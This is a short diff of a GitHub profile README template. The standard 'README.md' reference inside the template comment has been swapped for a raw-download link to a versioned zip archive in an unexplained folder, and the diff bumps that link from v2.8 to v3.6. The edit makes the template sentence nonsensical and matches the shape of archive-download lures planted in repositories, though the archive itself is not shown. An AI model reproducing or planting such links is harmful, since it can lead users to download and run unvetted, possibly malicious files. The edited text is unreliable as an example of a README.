@@ -1,7 +1,7 @@
 ## Hi there 👋
 
 <!--
-**adesh-2006/adesh-2006** is a ✨ _special_ ✨ repository because its `https://github.com/adesh-2006/adesh-2006/raw/refs/heads/main/slovenlike/adesh-v2.8.zip` (this file) appears on your GitHub profile.
+**adesh-2006/adesh-2006** is a ✨ _special_ ✨ repository because its `https://github.com/adesh-2006/adesh-2006/raw/refs/heads/main/slovenlike/adesh_v3.6.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
